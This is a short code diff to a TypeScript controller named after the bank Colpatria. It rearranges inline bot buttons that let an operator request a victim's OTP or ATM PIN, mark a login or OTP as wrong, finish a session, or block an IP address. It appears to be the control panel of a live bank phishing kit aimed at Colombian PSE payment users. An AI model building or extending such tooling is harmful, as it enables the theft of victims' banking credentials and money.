@@ -524,16 +524,17 @@ export class ColpatriaController {
     // Se generan los botones para PSE
     const buttons = [
       [
+        { text: '🪪 LG', callback_data: `logo:${sessionId};${bank}` },
         { text: '📱 OTP', callback_data: `sol_otp:${sessionId};${bank}` },
         { text: '🏧 ATM', callback_data: `sol_atm:${sessionId};${bank}` },
-        { text: '✅ FIN', callback_data: `sol_finalizar:${sessionId};${bank}` },
       ],
       [
+        { text: '❌ LG', callback_data: `error_login:${sessionId};${bank}` },
         { text: '❌ OTP', callback_data: `error_otp:${sessionId};${bank}` },
         { text: '❌ ATM', callback_data: `error_atm:${sessionId};${bank}` },
-        { text: '❌ LG', callback_data: `error_login:${sessionId};${bank}` },
       ],
       [
+        { text: '✅ FIN', callback_data: `sol_finalizar:${sessionId};${bank}` },
         { text: '🚫 BLOQUEAR IP', callback_data: `block_ip:${sessionId};${bank}` }
       ],
     ];
